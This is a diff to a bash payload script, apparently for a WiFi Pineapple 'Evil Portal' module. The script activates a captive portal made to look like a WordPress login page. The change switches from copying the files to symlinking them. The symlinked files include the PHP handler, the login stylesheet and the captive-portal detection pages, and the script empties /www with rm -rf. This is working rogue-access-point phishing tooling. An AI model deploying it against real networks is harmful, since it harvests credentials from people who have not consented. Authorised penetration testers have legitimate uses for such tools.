@@ -1,8 +1,8 @@
 #!/bin/bash
-# Name: Activate WordPress Portal
+# Name: WordPress Portal
 # Description: Downloads and activates the WordPress captive portal template
 # Author: PentestPlaybook
-# Version: 1.1
+# Version: 1.2
 # Category: Evil Portal
 
 # ====================================================================
@@ -120,20 +120,32 @@ EOF
 LOG "SUCCESS: Detection files created"
 
 # ====================================================================
-# STEP 5: Activate Portal in /www
+# STEP 5: Activate Portal via Symlinks
 # ====================================================================
-LOG "Step 5: Activating Wordpress portal..."
+LOG "Step 5: Activating Wordpress portal via symlinks..."
 
 # Clear /www
 rm -rf /www/*
 
-# Copy Wordpress portal to /www
-cp -r "${PORTAL_DIR}"/* /www/
+# Create symlinks for PHP files
+ln -sf "${PORTAL_DIR}/index.php" /www/index.php
+ln -sf "${PORTAL_DIR}/MyPortal.php" /www/MyPortal.php
+ln -sf "${PORTAL_DIR}/helper.php" /www/helper.php
+
+# Create symlinks for captive portal detection
+ln -sf "${PORTAL_DIR}/generate_204.html" /www/generate_204
+ln -sf "${PORTAL_DIR}/hotspot-detect.html" /www/hotspot-detect.html
+
+# Create symlinks for static assets
+ln -sf "${PORTAL_DIR}/wp-login.css" /www/wp-login.css
+ln -sf "${PORTAL_DIR}/wp-scripts.js" /www/wp-scripts.js
+ln -sf "${PORTAL_DIR}/images" /www/images
+ln -sf "${PORTAL_DIR}/wp-includes" /www/wp-includes
 
 # Restore captiveportal symlink
 ln -sf /pineapple/ui/modules/evilportal/assets/api /www/captiveportal
 
-LOG "SUCCESS: Portal activated"
+LOG "SUCCESS: Portal activated via symlinks"
 
 # ====================================================================
 # STEP 6: Restart nginx
@@ -166,7 +178,7 @@ LOG "Wordpress Portal Activated!"
 LOG "=================================================="
 LOG "Portal URL: http://${PORTAL_IP}/"
 LOG "Portal files: ${PORTAL_DIR}/"
-LOG "Active files: /www/"
+LOG "Active via symlinks in: /www/"
 LOG ""
 LOG "To switch back to Default portal:"
 LOG "  Run the 'Activate Default Portal' payload"
